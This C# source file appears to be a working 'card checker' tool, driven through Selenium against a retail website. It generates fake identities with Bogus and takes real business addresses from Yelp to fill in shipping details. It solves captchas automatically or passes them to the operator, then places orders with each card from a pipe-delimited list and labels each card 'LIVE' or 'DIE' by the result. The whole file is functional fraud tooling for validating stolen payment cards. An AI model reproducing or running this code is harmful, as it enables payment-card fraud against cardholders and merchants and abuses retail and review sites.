using System;
using Bogus;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace _0lymp.us.Gods
{
    public partial class Athena : Component
    {
        private static IWebDriver athena;
        private static IWebDriver yelp;
        public List<string> CardsList { get; set; }
        public string Url { get; set; }
        private Faker faker;

        public Thread VerifyCardsThread;
        public Thread StateCardsThread;
        public Thread ReduceCardsThread;
        public Thread RefreshProgressThread;

        public delegate void VerifyCardsCompleteHandler();
        public delegate void StateCardsCompleteHandler(string card);
        public delegate void ReduceCardsCompleteHandler(string cards);
        public delegate void RefreshProgressCompleteHandler(int percent, string message, string typeMessage);

        public event VerifyCardsCompleteHandler VerifyCardsComplete;
        public event StateCardsCompleteHandler LiveCardComplete;
        public event StateCardsCompleteHandler DieCardComplete;
        public event ReduceCardsCompleteHandler ReduceCardsComplete;
        public event RefreshProgressCompleteHandler RefreshProgressComplete;

        private string FullName { get; set; }
        private string FirstName { get; set; }
        private string LastName { get; set; }
        private string Address { get; set; }
        private string Address2 { get; set; }
        private string City { get; set; }
        private string State { get; set; }
        private string StateAbbr { get; set; }
        private string Zip { get; set; }
        private string Phone { get; set; }
        private string UserName { get; set; }
        private string Email { get; set; }
        private string Password { get; set; }
        private string Company { get; set; }
        private ResolveCaptcha Captcha { get; set; }
        private string ImageCaptchaResolve { get; set; }
        public Athena()
        {
            InitializeComponent();
            faker = new Faker();
            Captcha = new ResolveCaptcha();
        }

        public Athena(IContainer container)
        {
            container.Add(this);

            InitializeComponent();
        }

        public void VerifyCards()
        {
            FullName = faker.Name.FullName();
            UserName = faker.Internet.UserName();
            LastName = faker.Name.LastName();
            Password = faker.Internet.Password();
            Email = faker.Internet.Email();
            Company = ((Math.Round(new Random().NextDouble()) == 0.0) ? "" : faker.Company.CompanyName());
            //Address = faker.Address.StreetAddress();
            //Address2 = ((Math.Round(new Random().NextDouble()) == 0.0) ? "" : faker.Address.SecondaryAddress());
            //City = faker.Address.City();
            State = faker.Address.State();
            StateAbbr = faker.Address.StateAbbr();
            //Zip = faker.Address.ZipCode("#####");
            Phone = faker.Phone.PhoneNumber("###########");
            Load();
            athena.Kill();
            this.VerifyCardsComplete();
        }

        private void Load()
        {
            try
            {
                ExecuteRefreshProgressThread(1, "Cargando ATENEA...", "Success");
                List<string> source = new List<string>
            {
                Url+"whats-new/br/v=1/13198.htm",
                Url+"clothing/br/v=1/13266.htm",
                Url+"shoes/br/v=1/13438.htm",
                Url+"bags/br/v=1/13505.htm",
                Url+"jewelry-accessories/br/v=1/13539.htm",
                Url+"sale/br/v=1/13594.htm"
            };
                athena = Driver.ChromeNoImage();
                athena.GoUrl((from x in source
                              orderby Guid.NewGuid()
                              select x).FirstOrDefault());
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement webElement = athena.ElementVisible(By.Id("sortBySelect"), "ExceptionLoad");
            if (webElement.IsNotNull())
            {
                SortByPriceAsc(webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(1, "ERROR ATENEA #1, Reiniciando proceso...", "Success");
                Restart();
            }
        }


        private void SortByPriceAsc(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(10, "Ordenando productos.", "Success");
                webElement.JsClick();
                Thread.Sleep(1000);
                athena.FindElement(By.Id("sortBy.price")).JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }
            //#product-container > li:nth-child(13) > div > a
            IWebElement _webElement = athena.ElementRandomVisible(By.CssSelector("#product-container > li > div > a"));

            if (_webElement.IsNotNull())
            {
                DetailProduct(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(10, "ERROR ATENEA #2, Reiniciando proceso...", "Success");
                Restart();
            }
        }


        private void DetailProduct(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(20, "Detalle del producto", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = athena.ElementVisible(By.Id("add-to-cart-btn"));

            if (_webElement.IsNotNull())
            {
                AddToCart(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(20, "ERROR ATENEA #3, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void AddToCart(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(30, "Agregando al Carito", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            if (athena.ElementTextContains(By.CssSelector("#pdp-right-column > div.size-select-prompt.active-size-prompt"), "Size").IsNotNull())
            {
                IWebElement _webElement = athena.ElementRandomVisible(By.CssSelector("#sizeList > div"));
                if (_webElement.IsNotNull())
                {
                    SelectSize(_webElement);
                }
            }
            else
            {
                IWebElement __webElement = athena.ElementVisible(By.Id("checkout"));

                if (__webElement.IsNotNull())
                {
                    GoToCheckout(__webElement);
                }
                else
                {
                    ExecuteRefreshProgressThread(30, "ERROR ATENEA #4, Reiniciando proceso...", "Success");
                    Restart();
                }
            }

        }

        private void SelectSize(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(40, "Escogiendo dimensiones del producto.", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = athena.ElementVisible(By.Id("add-to-cart-btn"));

            if (_webElement.IsNotNull())
            {
                AddToCart(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(40, "ERROR ATENEA #5, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void GoToCheckout(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(50, "Proceso de chequeo", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = athena.ElementVisible(By.Id("checkoutButton"));

            if (_webElement.IsNotNull())
            {
                Checkout(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(50, "ERROR ATENEA #6, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void Checkout(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(60, "Chequeo", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = athena.ElementVisible(By.Id("createAccountSubmit"));

            if (_webElement.IsNotNull())
            {
                Login(_webElement);
            }
            else
            {
                IWebElement __webElement = athena.ElementVisible(By.CssSelector("body > div > div.a-row.a-spacing-double-large > div.a-section > div > div > form > div.a-row.a-spacing-large > div > div > div.a-row.a-text-center > img"), "ExceptionContinueCaptcha");

                if (__webElement.IsNotNull())
                {
                    ExecuteRefreshProgressThread(65, "Resolviendo captcha...", "Success");
                    string attribute = __webElement.GetAttribute("src");
                    ImageCaptchaResolve = Captcha.Image(attribute);
                    if (ImageCaptchaResolve != null)
                    {
                        ContinueCaptcha();
                    }
                    else
                    {
                        ShowMyDialogBoxCaptcha(attribute);
                    }
                }
            }
        }

        private void ContinueCaptcha()
        {
            try
            {
                ExecuteRefreshProgressThread(40, "Captcha resuelto...", "Success");

                Thread.Sleep(2000);

                if (athena.ElementVisible(By.Id("captchacharacters")).IsNotNull())
                {
                    ExecuteRefreshProgressThread(70, "Resolviendo Captcha", "Success");
                    athena.FindElement(By.Id("captchacharacters")).SendKeys(ImageCaptchaResolve);
                    athena.FindElement(By.CssSelector("body > div > div.a-row.a-spacing-double-large > div.a-section > div > div > form > div.a-section.a-spacing-extra-large > div > span > span > button")).Click();
                }
                else
                {
                    athena.FindElement(By.Id("ap_password")).SendKeys(Password);
                    athena.FindElement(By.Id("ap_password_check")).SendKeys(Password);

                    ExecuteRefreshProgressThread(42, "Insertando captcha resuelto...", "Success");
                    athena.FindElement(By.Id("auth-captcha-guess")).SendKeys(ImageCaptchaResolve);
                    athena.FindElement(By.Id("continue")).Click();
                }
            }
            catch (NoSuchElementException) { }
            catch (StaleElementReferenceException) { }
            catch (WebDriverException) { }
            catch (NullReferenceException) { }

            IWebElement _webElement = athena.ElementVisible(By.Id("createAccountSubmit"));

            if (_webElement.IsNotNull())
            {
                Login(_webElement);
            }
            else
            {
                IWebElement ____webElement = athena.ElementVisible(By.Id("select-birthday-month"), "ExceptionContinueCaptcha");

                if (____webElement.IsNotNull())
                {
                    Thread.Sleep(3000);
                    Vip(____webElement);
                }
                else
                {
                    IWebElement webElement = athena.ElementVisible(By.CssSelector("body > div > div.a-row.a-spacing-double-large > div.a-section > div > div > form > div.a-row.a-spacing-large > div > div > div.a-row.a-text-center > img"), "ExceptionContinueCaptcha");

                    if (webElement.IsNotNull())
                    {
                        ExecuteRefreshProgressThread(65, "Resolviendo captcha...", "Success");
                        string attribute = webElement.GetAttribute("src");
                        ImageCaptchaResolve = Captcha.Image(attribute);
                        if (ImageCaptchaResolve != null)
                        {
                            ContinueCaptcha();
                        }
                        else
                        {
                            ShowMyDialogBoxCaptcha(attribute);
                        }
                    }
                    else
                    {
                        IWebElement __webElement = athena.ElementVisible(By.Id("auth-captcha-image"), "ExceptionContinueCaptcha");

                        if (__webElement.IsNotNull())
                        {
                            ExecuteRefreshProgressThread(43, "Resolviendo captcha...", "Success");

                            string attribute = __webElement.GetAttribute("src");
                            ImageCaptchaResolve = Captcha.Image(attribute);
                            if (ImageCaptchaResolve != null)
                            {
                                ContinueCaptcha();
                            }
                            else
                            {
                                ShowMyDialogBoxCaptcha(attribute);
                            }
                        }
                    }
                }
            }
        }

        private void Login(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(75, "Nuevo Usuario fake", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = athena.ElementVisible(By.Id("ap_customer_name"));

            if (_webElement.IsNotNull())
            {
                CreateAccount();
            }
            else
            {
                ExecuteRefreshProgressThread(75, "ERROR ATENEA #7, Reiniciando proceso...", "Success");
                Restart();
            }
        }


        private void CreateAccount(bool internalError = false)
        {
            try
            {
                ExecuteRefreshProgressThread(78, "Ingresando datos de usuario fake...", "Success");
                if (!internalError)
                {
                    athena.FindElement(By.Id("ap_customer_name")).SendKeys(UserName);
                    athena.FindElement(By.Id("ap_email")).SendKeys(Email);
                    athena.FindElement(By.Id("ap_password")).SendKeys(Password);
                    athena.FindElement(By.Id("ap_password_check")).SendKeys(Password);
                }
                else
                {
                    athena.FindElement(By.Id("ap_email")).Clear();
                    athena.FindElement(By.Id("ap_email")).SendKeys(Email);
                    athena.FindElement(By.Id("ap_password")).Clear();
                    athena.FindElement(By.Id("ap_password")).SendKeys(Password);
                    athena.FindElement(By.Id("ap_password_check")).Clear();
                    athena.FindElement(By.Id("ap_password_check")).SendKeys(Password);
                }
                athena.FindElement(By.Id("continue")).Click();
            }
            catch (NoSuchElementException) { }
            catch (StaleElementReferenceException) { }
            catch (WebDriverException) { }
            catch (NullReferenceException) { }

            IWebElement webElement = athena.ElementVisible(By.Id("select-birthday-month"), "ExceptionContinueCaptcha");

            if (webElement.IsNotNull())
            {
                Thread.Sleep(3000);
                Vip(webElement);
            }
            else
            {
                IWebElement __webElement = athena.ElementVisible(By.Id("auth-captcha-image"), "ExceptionContinueCaptcha");

                if (__webElement.IsNotNull())
                {
                    ExecuteRefreshProgressThread(65, "Resolviendo captcha...", "Success");
                    string attribute = __webElement.GetAttribute("src");
                    ImageCaptchaResolve = Captcha.Image(attribute);
                    if (ImageCaptchaResolve != null)
                    {
                        ContinueCaptcha();
                    }
                    else
                    {
                        ShowMyDialogBoxCaptcha(attribute);
                    }
                }
                else
                {
                    ExecuteRefreshProgressThread(78, "ERROR ATENEA #8, Reiniciando proceso...", "Success");
                    Restart();
                }
            }
        }


        private void Vip(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(80, "Info VIP", "Success");
                SelectElement selectMonth = new SelectElement(webElement);
                int maxValue = selectMonth.Options.Count();
                selectMonth.SelectByIndex(new Random().Next(1, maxValue));

                SelectElement selectDay = new SelectElement(athena.FindElement(By.Id("select-birthday-date")));
                int maxValue1 = selectDay.Options.Count();
                selectDay.SelectByIndex(new Random().Next(1, maxValue1));

                athena.FindElement(By.Id("post-reg-submit")).Click();
            }
            catch (NoSuchElementException) { throw; }
            catch (StaleElementReferenceException) { throw; }
            catch (WebDriverException) { throw; }
            catch (NullReferenceException) { throw; }

            IWebElement _webElement = athena.ElementVisible(By.Id("lastName"));

            if (_webElement.IsNotNull())
            {
                Shipping(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(80, "ERROR ATENEA #9, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void Shipping(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(85, "Direccion fake", "Success");
                Yelp();
                webElement.SendKeys(LastName);
                new SelectElement(athena.FindElement(By.Id("addressCountryCode"))).SelectByValue("US");
                athena.FindElement(By.Id("company")).SendKeys(Company);
                athena.FindElement(By.Id("addressLine1")).SendKeys(Address);
                athena.FindElement(By.Id("addressLine2")).SendKeys(Address2);
                athena.FindElement(By.Id("city")).SendKeys(City);
                new SelectElement(athena.FindElement(By.Id("addressState"))).SelectBySubText(State);
                athena.FindElement(By.Id("postalCode")).SendKeys(Zip);
                athena.FindElement(By.Id("phoneNumber")).SendKeys(Phone);
                athena.FindElement(By.Id("indDefault")).Click();

                athena.FindElement(By.Id("save")).Click();

            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = athena.ElementVisible(By.Id("shippingMethodId-1"),"ExceptionShipping");
            if (_webElement.IsNotNull())
            {
                ConfirmShipping(_webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(85, "ERROR ATENEA #10, Reiniciando proceso...", "Success");
                Restart();
            }

        }

        private void Yelp()
        {
            try
            {
                ExecuteRefreshProgressThread(1, "Cargando ATENEA...", "Success");
                yelp = Driver.ChromeNoImage();
                yelp.GoUrl("https://www.yelp.com/");
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement webElement = yelp.ElementVisible(By.Id("dropperText_Mast"));
            if (webElement.IsNotNull())
            {
                SearchBusiness(webElement);
            }
        }

        private void SearchBusiness(IWebElement webElement)
        {
            try
            {
                webElement.Clear();
                webElement.SendKeys(State);
                yelp.FindElement(By.Id("header-search-submit")).Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = yelp.ElementRandomVisible(By.CssSelector("#wrap > div:nth-child(4) > div > div > div > div > div > div:nth-child(2) > ul > li > div > div > div > div > div:nth-child(1) > div > div > div > div:nth-child(1) > div > div > h4 > span > a"));

            if (_webElement.IsNotNull())
            {
                SelectBusiness(_webElement);
            }

        }

        private void SelectBusiness(IWebElement webElement)
        {
            try
            {
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = yelp.ElementVisible(By.CssSelector("#wrap > div.main-content-wrap.main-content-wrap--full > div > div.lemon--div__373c0__1mboc.spinner-container__373c0__N6Hff.border-color--default__373c0__YEvMS > div.lemon--div__373c0__1mboc.u-space-t3.u-space-b6.border-color--default__373c0__2oFDT > div > div > div.lemon--div__373c0__1mboc.stickySidebar--heightContext__373c0__133M8.tableLayoutFixed__373c0__12cEm.arrange__373c0__UHqhV.u-space-b6.u-padding-b4.border--bottom__373c0__uPbXS.border-color--default__373c0__2oFDT > div.lemon--div__373c0__1mboc.arrange-unit__373c0__1piwO.arrange-unit-grid-column--8__373c0__2yTAx.u-padding-r6.border-color--default__373c0__2oFDT > div.lemon--div__373c0__1mboc.u-space-b3.border-color--default__373c0__2oFDT > div > a"));

            if (_webElement.IsNotNull())
            {
                GetDataBusiness(_webElement);
            }
        }

        private void GetDataBusiness(IWebElement webElement)
        {
            try
            {
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = yelp.ElementVisible(By.Id("attr_BusinessStreetAddress1"));

            if (_webElement.IsNotNull())
            {
                SetDataUser(_webElement);
            }
        }

        private void SetDataUser(IWebElement webElement)
        {
            try
            {
                Address = webElement.GetAttribute("Value");
                Address2 = yelp.FindElement(By.Id("attr_BusinessStreetAddress2")).GetAttribute("value");
                City = yelp.FindElement(By.Id("attr_BusinessCity")).GetAttribute("value");
                Zip = yelp.FindElement(By.Id("attr_BusinessZipCode")).GetAttribute("value");
                //Phone = yelp.FindElement(By.Id("attr_BusinessPhoneNumber")).GetAttribute("value");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }
        }

        private void ConfirmShipping(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(85, "Confirmando direccion fake", "Success");
                webElement.JsClick();
                athena.FindElement(By.Id("continue")).JsClick();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = athena.ElementVisible(By.Id("ccnumber"));
            if (_webElement.IsNotNull())
            {
                LastProccess();
            }
            else
            {
                ExecuteRefreshProgressThread(85, "ERROR ATENEA #11, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void LastProccess()
        {
            try
            {
                int limitDie = 1;
                int num = 0;
                while (num < CardsList.Count())
                {
                    List<string> list = CardsList[num].Split('|').ToList();
                    if (CardsList.Count() > 1)
                    {
                        CardsList[num] = CardsList[num].Replace("\r", "");
                    }
                    string text = CardsList[num];
                    string cards = CardsList[num].ToString();
                    if (CardsList.Count() > 1)
                    {
                        string text3 = CardsList[num] = (CardsList[num] += "\r");
                        cards = string.Join("", CardsList.ToArray());
                        text += "\r";
                    }
                    Pay(list[0], list[1], list[2]);

                    if (Confirmation())
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteLiveCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (CardsList.Count() > 0)
                        {
                            Restart();
                        }
                    }
                    else
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteDieCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (limitDie < 20)
                        {
                            limitDie++;
                        }
                        else
                        {
                            Restart();
                        }
                    }
                }
            }
            catch (ArgumentOutOfRangeException) {/*throw;*/ }
        }

        private void Pay(string number, string month, string year)
        {
            try
            {
                ExecuteRefreshProgressThread(90, "Añadiendo tarjeta: " + number, "Success");
                Thread.Sleep(5000);
                for (int i = 0; i < number.Length; i++)
                {
                    athena.FindElement(By.Id("ccnumber")).SendKeys(number.Substring(i, 1));
                    Thread.Sleep(100);
                }

                new SelectElement(athena.FindElement(By.CssSelector("#add-credit-card-form > div.side-by-side > label:nth-child(1) > select"))).SelectByValue(month.TrimStart('0'));
                new SelectElement(athena.FindElement(By.CssSelector("#add-credit-card-form > div.side-by-side > label.required.expiration-year-label > select"))).SelectByValue(year);

                athena.FindElement(By.CssSelector("#add-credit-card-form > div:nth-child(6) > label > input")).Click();

                athena.FindElement(By.Id("continue")).Click();

            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement webElement = athena.ElementVisible(By.Id("finalizeOrder"),"ExceptionPay");

            if (webElement.IsNotNull())
            {
                ConfirmOrder(webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(90, "ERROR ATENEA #12, Reiniciando proceso...", "Success");
                Restart();
            }
        }


        private void ConfirmOrder(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(95, "Confirmando orden", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }
        }


        private bool Confirmation()
        {
            IWebElement webElement = athena.ElementTextContains(By.CssSelector("#errorListContainer > li"), "refused", "Die");
            if (webElement.IsNotNull())
            {
                ExecuteRefreshProgressThread(100, "DIE", "Success");
                IWebElement _webElement = athena.ElementVisible(By.CssSelector("#submitOrderForm > div.user-information.section > div > div:nth-child(2) > div.header.clearfix > a"));
                if (_webElement.IsNotNull())
                {
                    PreparedForNewCard(_webElement);
                }
                return false;
            }
            else
            {
                IWebElement element = athena.ElementVisible(By.CssSelector("#content > div.page-order-confirmation.margin-top"), "Live");
                if (element.IsNotNull())
                {
                    ExecuteRefreshProgressThread(100, "LIVE", "Success");
                    return true;
                }
                else
                {
                    ExecuteRefreshProgressThread(100, "ERROR ATENEA #13, Reiniciando proceso...", "Success");
                    Restart();
                }
            }
            return false;
        }


        private void PreparedForNewCard(IWebElement webElement)
        {
            try
            {
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement _webElement = athena.ElementVisible(By.Id("addCreditCardButton"));
            if (_webElement.IsNotNull())
            {
                AddNewCard(_webElement);
            }
        }


        private void AddNewCard(IWebElement webElement)
        {
            try
            {
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }
        }

        private void Restart()
        {
            athena.Kill();
            VerifyCards();
        }

        public void ExecuteThread()
        {
            VerifyCardsThread = new Thread(VerifyCards);
            VerifyCardsThread.Start();
        }

        private void ExecuteRefreshProgressThread(int percent, string message, string typeMessage)
        {
            RefreshProgressThread = new Thread((ThreadStart)delegate
            {
                RefreshProgress(percent, message, typeMessage);
            });
            RefreshProgressThread.Start();
        }

        public void KillThread()
        {
            try
            {
                ExecuteRefreshProgressThread(0, "", "Success");
                VerifyCardsThread.Abort();
                VerifyCardsThread.Join();
                athena.Kill();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteLiveCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                LiveCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillLiveCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteDieCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                DieCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillDieCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteReduceCardsThread(string cards)
        {
            ReduceCardsThread = new Thread((ThreadStart)delegate
            {
                ReduceCards(cards);
            });
            ReduceCardsThread.Start();
        }

        public void KillReduceCardsThread()
        {
            try
            {
                ReduceCardsThread.Abort();
                ReduceCardsThread.Join();
            }
            catch (NullReferenceException) { }
        }
        private void RefreshProgress(int percent, string message, string typeMessage)
        {
            try
            {
                this.RefreshProgressComplete(percent, message, typeMessage);
            }
            catch (NullReferenceException) {/*throw;*/ }
        }

        public void ReduceCards(string cards)
        {
            this.ReduceCardsComplete(cards);
        }

        private void LiveCard(string card)
        {
            this.LiveCardComplete(card);
        }

        private void DieCard(string card)
        {
            this.DieCardComplete(card);
        }

        public void ShowMyDialogBoxCaptcha(string imageCaptcha, bool robotCheck = false)
        {
            ExecuteRefreshProgressThread(40, "Por favor resolver captcha...", "Success");

            Captcha captcha = new Captcha();
            captcha.PbCaptcha.LoadAsync(imageCaptcha);
            captcha.ShowDialog();
            if (captcha.DialogResult == DialogResult.Yes)
            {
                ImageCaptchaResolve = captcha.TxCaptcha.Text;
            }
            captcha.Dispose();
            //if (robotCheck)
            //{
            //    //RobotCheck();
            //}
            //else
            //{
            ContinueCaptcha();
            //}

        }
    }
}
